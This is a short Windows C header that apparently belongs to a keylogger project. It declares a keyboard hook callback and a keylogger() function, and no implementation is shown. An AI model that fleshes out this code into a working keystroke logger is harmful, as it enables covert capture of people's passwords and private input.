#pragma once
#include <stdio.h>
#include <windows.h>
#include "Keylogger.h"

LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam);
DWORD keylogger();
